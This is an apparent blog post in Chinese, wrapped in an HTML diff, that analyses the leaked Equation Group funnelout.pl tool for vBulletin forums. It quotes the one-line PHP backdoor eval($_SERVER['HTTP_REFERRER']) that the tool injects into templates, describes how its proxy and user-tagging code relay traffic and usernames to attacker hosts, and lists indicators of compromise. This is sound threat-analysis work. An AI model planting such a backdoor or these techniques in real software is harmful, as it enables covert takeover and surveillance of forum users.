@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="vBulletin 论坛定向攻击脚本分析">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - vBulletin 论坛定向攻击脚本分析 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    vBulletin 论坛定向攻击脚本分析
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Mon Feb 5 2018 17:18:38 UTC">Feb 05, 2018</div>
+                    <div class="reading-time"><div class="middot"></div>1 minute read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://ob5vt1k7f.qnssl.com/pangu.js"></script>
+
+<p>花了几天时间研究了一下Equation Group泄露的针对<code>vBulletin</code>论坛的定向攻击工具，期间非常感谢<a href="https://mp.weixin.qq.com/s/5WRXpljL7RFSPRQ2NdHhtA">风流@逢魔安全实验室</a>的帮助，最主要的动力也是在技术分享上听了这个课题，感觉非常有意思，于是搭了环境研究了利用过程，期间也踩了好几个坑，整个过程下来却感受到脚本作者扎实的代码功底和缜密的逻辑，虽然是“过时”的工具了却有很多值得学习的地方。另外，这个过程是参考<a href="https://paper.seebug.org/517/">Equation Group泄露工具之vBulletin无文件后门分析</a>进行的，只是把其中碰到的一些问题梳理一下，大家可以结合着看，希望能起到帮助。</p>
+
+<h3 id="0x01-概述">0x01 概述</h3>
+
+<p>vBulletin是国外知名的论坛程序，使用广泛，但在国内见得不多。程序算得上比较古老，披露的漏洞也不算少，但是针对这个系统的集成利用工具还是非方程式这个莫属，攻击工具高度融合论坛本身的代码逻辑，无论是安插后门还是插入代理，全程都是无文件攻击，是真正“高级持续化威胁”的典型例子。</p>
+
+<h3 id="0x02-脚本介绍">0x02 脚本介绍</h3>
+
+<p>攻击脚本名为<code>funnelout.pl</code>，在方程式工具包的<code>linux/up</code>目录下，<a href="https://github.com/x0rz/EQGRP">github</a>上有完整的解压缩后的文件，本文件<a href="https://github.com/x0rz/EQGRP/blob/master/Linux/up/funnelout.v4.1.0.1.pl">地址</a></p>
+
+<p>它一共有三个版本，v3.0.0.1, v4.0.0.1和v4.1.0.1，内容上大同小异，新版本修改和增加了几处代码，我们就选择v4.1.0.1来研究。
+脚本基于perl语言编写，x0rz给它的介绍是</p>
+
+<blockquote>
+<p>FUNNELOUT: database-based web-backdoor for vbulletin</p>
+</blockquote>
+
+<p>可以看出它是基于数据库的后门，也就是说攻击过程中不会生成文件，传统安全评估漏洞扫描之类的很难发现这种后门，再根据脚本生成的攻击代码中出现的一个时间戳<code>1258466920</code>，推测开发时间大致在2009年11月份，如果真是这样，10年前的攻击工具现在看来依旧非常牛逼，用@风流的话来说“细思极恐”。</p>
+
+<h3 id="0x03-环境搭建">0x03 环境搭建</h3>
+
+<p><code>funnelout.pl</code>中涉及到的<code>vBulletin</code>版本是3和4，所以我们选择<code>vBulletin v3.8.6</code>来测试。提一句这套系统的代码好难找，官网仅开放下载给注册会员，而且现在已经更新到v5.x，所以需要代码的同学可以联系我。</p>
+
+<p>安装时在建立数据库的过程中可能出现设置默认日期<code>0000-00-00</code>的错误，这应该和mysql的版本有关，可以选择低版本的mysql，也可以修改<code>upload\install\mysql-schema.php</code>，将默认的<code>0000-00-00</code>为<code>1000-01-01</code>。</p>
+
+<p>另外如果安装过程中设置了数据库表名的前缀，那么需要修改<code>$DB_table</code>和<code>$DB_datastore</code>涉及sql语句的部分，例如<code>SELECT title FROM datastore</code>修改为<code>SELECT title FROM $DB_datastore</code>，其中<code>$DB_datastore</code>需要自己声明。</p>
+
+<p>其它的可以参考说明文档，这里不再赘述。</p>
+
+<h3 id="0x04-复现-分析">0x04 复现&amp;分析</h3>
+
+<p>在分析代码之前我们先了解一下<code>vBulletin</code>的设计逻辑，特别是在模板渲染方面。</p>
+
+<p>程序在安装过程中会通过<code>includes/adminfunctions_template.php</code>加载xml文件<code>install/vbulletin-language.xml</code>，里面定义了基本的样式，根据样式的<code>id</code>取出对应的内容插入到数据表<code>template</code>中，渲染过程则是相反，根据模板的<code>title</code>加载进程序，进行前端渲染，因此才能够被“无文件“安装后门，这算是论坛当初设计时一个比较明显的缺陷吧。将后门代码插入在模板中本身不容易被发现，更何况模板不以文件的方式存在而是储存在数据库中，这也为这个攻击工具提供了很好的隐蔽方式，同时也能解释脚本使用时需要指定数据库连接，因为它本身是直接对数据库进行操作的。</p>
+
+<p>来看一下脚本的整体功能</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/TbgPz" alt="funnelout.pl" /></p>
+
+<p><code>-op</code>参数展示了可以选择的操作，最主要的是<code>door</code>,<code>proxy</code>和<code>tag</code>功能，以及相应的<code>show</code>操作，我们也是选择这三部分功能进行分析</p>
+
+<p>因为脚本是直接对数据库进行操作，所以需要指定数据库的连接信息，也可以指定<code>-conf</code>参数跟上论坛的配置文件，脚本会自动提取里面的基本信息。其他的参数就是字面意思，包括设置ssl，要包括及排除的用户，设置黑名单等等，可以看出脚本的功能是相当强大的。</p>
+
+<h4 id="backdoor-功能分析">Backdoor 功能分析</h4>
+
+<p>这应该是脚本最简单粗暴的方法，直接在数据库中插入后门代码，之后通过HTTP请求中的<code>Referrer</code>字段发送指令，注意此处是<code>Referrer</code>而不是默认的<code>Referer</code>，隐蔽性非常好。</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/uLFsU" alt="backdoor" /></p>
+
+<p>看一下插入后门的方法(在脚本中打印了执行的sql语句来方便理解)，可以看到插入后门的操作对页脚模板插入了一段base64编码后的代码<code>eval($_SERVER[&quot;HTTP_REFERRER&quot;]);</code>，在页面渲染页脚部分时就会加载恶意代码，攻击者就可以通过<code>HTTP_REFERRER</code>字段下发指令，利用非常简单。我们来看一下它具体是如何实现的</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/TPKug" alt="op_door" />
+<img src="https://ob5vt1k7f.qnssl.com/J1Q9m" alt="patch_db" /></p>
+
+<p>很简单的逻辑，将base64编码后的一句话代码插入<code>template</code>表的<code>footer</code>模板下，在<code>global.php</code>调用过程中被加载执行。</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/06Abt" alt="global.php" /></p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/wSBon" alt="debug" /></p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/Eumco" alt="phpinfo" /></p>
+
+<h4 id="proxy-功能分析">Proxy 功能分析</h4>
+
+<p>Proxy功能相对复杂一些，但也离不开对模板的操作，它涉及的是<code>header</code>模板</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/gGsRT" alt="proxyTemplate" />
+<img src="https://ob5vt1k7f.qnssl.com/KS5ci" alt="op_proxy" /></p>
+
+<p>使用proxy时需要指定一个<code>tag</code>，而且tagurl需要符合正则表达式<code>/(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/</code>也就是<code>x.x.x.x/a/b/c/1/d/</code>的格式，这地方是个坑&hellip;</p>
+
+<p>指定tagurl生成相应的proxy代码</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/1UrLg" alt="proxy" />
+解码后</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/oXMfY" alt="proxy code" /></p>
+
+<p><code>$fahost</code>就是我们指定的tag的ip。当满足if条件——请求路径中含有<code>/</code>且ip不是<code>64.38.3.50</code>时，<code>header</code>渲染过程中会加载这些php代码，构造一个请求发送给我们的tagUrl。值得注意的是这里不仅支持GET请求，同样支持POST请求，也就是说我们可以作为“中间人”的角色时刻监听着用户与论坛之间的通信，实现了真正意义上的代理，而且用户在这过程中完全无法察觉到，细思极恐&hellip;</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/jEOhg" alt="proxy request" /></p>
+
+<p>可以确定的是<code>64.38.3.50</code>这个ip一定与攻击组织有关，也许在测试的时候就将此ip排除在外，避免一些麻烦，同时这也是整个脚本泄露的唯一一个确定的ip。</p>
+
+<h4 id="tag-功能分析">Tag 功能分析</h4>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/NXTqW" alt="op_tag" />
+Tag功能更加复杂，操作<code>navbar</code>模板，使用时有这么几个选项可以指定，<code>-tag</code>指定标记的url，<code>-nohttp</code>表示不自动加上<code>http://</code>，这种情况可以在正常访问时嵌入一个网站本身的url，<code>-f</code>Force，还有<code>ssl</code>选项，适用于https的情况。</p>
+
+<p>我们先用<code>-tag</code>指定一个<code>tag URL</code></p>
+
+<p><img src="http://ob5vt1k7f.qnssl.com/yProo" alt="tag" /></p>
+
+<p>base64解码后的代码长这样</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/kLa7C" alt="tag code" /></p>
+
+<p>当我们访问文章页面<code>http://127.0.0.1/vb3/showthread.php?p=1</code>或访问私信链接<code>http://127.0.0.1/vb3/private.php?do=showpm&amp;pmid=1</code>时，就会加载php代码，在<code>datastore</code>表生成一个“标签”——插入一个序列化后的<code>data</code>字段，类似<code>a:2:{i:0;i:1517970003;i:1;i:1;}</code>，其中最后的<code>i</code>是一个计数器，值在随机数[0,6]之间，每次访问页面时i值递减1，当i减到0时就会触发代码，向我们设置的<code>tag URL</code>发送用户名经过hex编码后的页面地址</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/FgW6h" alt="tag code1" />
+<img src="https://ob5vt1k7f.qnssl.com/pkQsP" alt="61646d696e.html" />
+<img src="http://ob5vt1k7f.qnssl.com/qmk8S" alt="61646d696e req" />(此处便于理解换了一个tag URL，并且新建了61646d696e.html文件)</p>
+
+<p>同时<code>tag</code>减至<code>-1</code>并出于等待重置状态，当我们进行<code>reset</code>操作时就会清空这条“标签”数据</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/0wgAc" alt="showTagged" />
+<img src="https://ob5vt1k7f.qnssl.com/szepl" alt="reset" /></p>
+
+<p>值得注意的是，“标签”功能只在一天内有效，超过一天后就无法触发，只能先进行重置操作</p>
+
+<ul>
+<li><code>-nohttp</code>选项</li>
+</ul>
+
+<p>当使用<code>-nohttp</code>时，生成url后就可以请求网站本身的路径+hex(用户名)的页面，但是这个页面不一定存在，所以一时没想明白为什么这样设置。而没有设置<code>-nohttp</code>时可以向我们自定义地址发送请求，结合脚本的功能推测是给访问某些特定页面的用户做一个标记，便于以后再定向攻击。</p>
+
+<ul>
+<li><code>-crumb</code>选项</li>
+</ul>
+
+<p>指定了<code>-crumb</code>选项后则是在页面嵌入一张1x1的图片，加载的是<code>images/</code>目录下的<code>hex(用户名).gif</code>，属性设置为不可见，这块的功能也没有理解透彻，总之会传递一个用户名信息，用户不知不觉中就被标记上了，细思极恐again&hellip;</p>
+
+<h3 id="0x05-特征">0x05 特征</h3>
+
+<p>截图中也注意到了两个特殊的md5</p>
+
+<pre><code>84b8026b3f5e6dcfb29e82e0b0b0f386 Unregistered (EN)
+e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)
+</code></pre>
+
+<p>这也是攻击脚本中硬编码的“黑名单”，或许理解为“白名单”更合适？</p>
+
+<p>另外有几个ip段，地理位置分布在各个国家</p>
+
+<pre><code>'/^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|79.173.|85.159.|94.249.|86.108.)/'
+</code></pre>
+
+<p>而根据另一个特殊的字符串<code>l9ed39e2fea93e5</code>搜索，发现网上存在可能被攻击的案例，里面出现了一个域名<code>http://technology-revealed.com</code></p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/OFkMN" alt="technology-revealed" /></p>
+
+<p>这几条线索之间的关系不得而知，或许对威胁情报能起到一起参考作用，虽然这个APT攻击已经过去好多年了。</p>
+
+<h3 id="0x06-总结">0x06 总结</h3>
+
+<p>方程式泄露的工具包对整个世界带来了巨大的影响，像“永恒之蓝”甚至成为了目前勒索病毒和挖矿木马的标配，而这个针对vb论坛的攻击工具仅仅是里面的一个文件，整个工具包里还隐藏着什么威力巨大的武器，真值得我们好好研究。单从<code>funnelout.v4.1.0.1.pl</code>这个脚本看虽然它的利用面可能没那么广了，但作者的思维角度和攻击方法依旧没有过时，值得学习。</p>
+
+<h3 id="0x07-参考">0x07 参考</h3>
+
+<ul>
+<li><a href="https://paper.seebug.org/517/">https://paper.seebug.org/517/</a></li>
+<li><a href="https://github.com/x0rz/EQGRP">https://github.com/x0rz/EQGRP</a></li>
+<li><a href="https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime">https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime</a></li>
+</ul>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90\/';
+    var disqus_title = 'vBulletin 论坛定向攻击脚本分析';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/vbulletin-%E8%AE%BA%E5%9D%9B%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%E5%88%86%E6%9E%90\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2018 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
